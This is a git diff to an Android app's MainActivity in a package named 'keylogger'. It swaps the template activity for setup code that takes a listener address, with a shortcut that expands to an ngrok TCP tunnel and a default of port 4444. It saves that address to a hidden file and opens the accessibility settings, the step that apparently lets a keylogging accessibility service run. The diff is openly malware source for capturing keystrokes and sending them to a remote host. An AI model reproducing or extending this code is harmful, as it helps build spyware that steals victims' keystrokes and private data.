@@ -1,77 +1,95 @@
 package com.example.keylogger;
 
-import android.os.Bundle;
 
-import com.google.android.material.snackbar.Snackbar;
+import android.Manifest; // Import the FileWriter class
+import java.io.IOException;  // Import the IOException class to handle errors
+import android.app.*;
+import android.os.*;
+//import android.util.Log;
+import android.widget.*;
+import android.view.View.*;
+import android.view.*;
+import android.content.*;
+import android.provider.*;
+import java.io.*;
+import java.util.jar.*;
+import android.*;
+import java.security.*;
+import android.content.pm.*;
+import java.nio.file.*;
 
-import androidx.appcompat.app.AppCompatActivity;
 
-import android.view.View;
-
-import androidx.navigation.NavController;
-import androidx.navigation.Navigation;
-import androidx.navigation.ui.AppBarConfiguration;
-import androidx.navigation.ui.NavigationUI;
-
-import com.example.keylogger.databinding.ActivityMainBinding;
-
-import android.view.Menu;
-import android.view.MenuItem;
-
-public class MainActivity extends AppCompatActivity {
-
-    private AppBarConfiguration appBarConfiguration;
-    private ActivityMainBinding binding;
-
+public class MainActivity extends Activity
+{
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
+    protected void onCreate(Bundle savedInstanceState)
+    {
         super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        if (new File(getExternalFilesDir("key"),"fix.dat").exists()){
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            finish();
+        }else{
+            final Button bnt1= findViewById(R.id.mainButton1);
+            final EditText txt =findViewById(R.id.mainEditText1);
+            txt.setText("");
+            bnt1.setOnClickListener( new View.OnClickListener (){
+                @Override
+                public void onClick(View p1){
 
-        binding = ActivityMainBinding.inflate(getLayoutInflater());
-        setContentView(binding.getRoot());
+                    String ip = txt.getText().toString();
+                    if (!ip.equals("")){
+                        if(scut(ip)){
+                            ip=ip.split(":")[0].split(",")[0]+".tcp.ngrok.io:"+ip.split(":")[1];
+                            //Toast.makeText(MainActivity.this,ip,Toast.LENGTH_SHORT).show();
+                        }
+                        if (ip!=null){
+                            if (ip.equals("ip")){
+                                ip="0.0.0.0:4444";
+                            }
+                            save(ip);
+                            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                            finish();
+                        }
+                        else{
+                            txt.setText("");
 
-        setSupportActionBar(binding.toolbar);
+                        }
+                    }
+                }
+            });
 
-        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
-        appBarConfiguration = new AppBarConfiguration.Builder(navController.getGraph()).build();
-        NavigationUI.setupActionBarWithNavController(this, navController, appBarConfiguration);
-
-        binding.fab.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
-                        .setAnchorView(R.id.fab)
-                        .setAction("Action", null).show();
-            }
-        });
-    }
-
-    @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        // Inflate the menu; this adds items to the action bar if it is present.
-        getMenuInflater().inflate(R.menu.menu_main, menu);
-        return true;
-    }
-
-    @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        // Handle action bar item clicks here. The action bar will
-        // automatically handle clicks on the Home/Up button, so long
-        // as you specify a parent activity in AndroidManifest.xml.
-        int id = item.getItemId();
-
-        //noinspection SimplifiableIfStatement
-        if (id == R.id.action_settings) {
-            return true;
         }
 
-        return super.onOptionsItemSelected(item);
     }
 
-    @Override
-    public boolean onSupportNavigateUp() {
-        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
-        return NavigationUI.navigateUp(navController, appBarConfiguration)
-                || super.onSupportNavigateUp();
+    public void save(String s1){
+        File f1 = new File(getExternalFilesDir("key"),"fix.dat");
+        if (f1.exists()){
+            f1.delete();
+
+        }
+        FileOutputStream fos;
+        try{
+            fos = new FileOutputStream(f1,true);
+            fos.write(s1.getBytes());
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+    }//
+    public boolean scut(String t1){
+        try{
+            if(t1.split(":")[0].split(",")[1].equals("n")){
+                //Toast.makeText(MainActivity.this,t2,Toast.LENGTH_SHORT).show();
+                return true;
+            }
+            else{
+                return false;
+            }
+        }catch(Exception e){
+            return false;
+        }
+
     }
 }
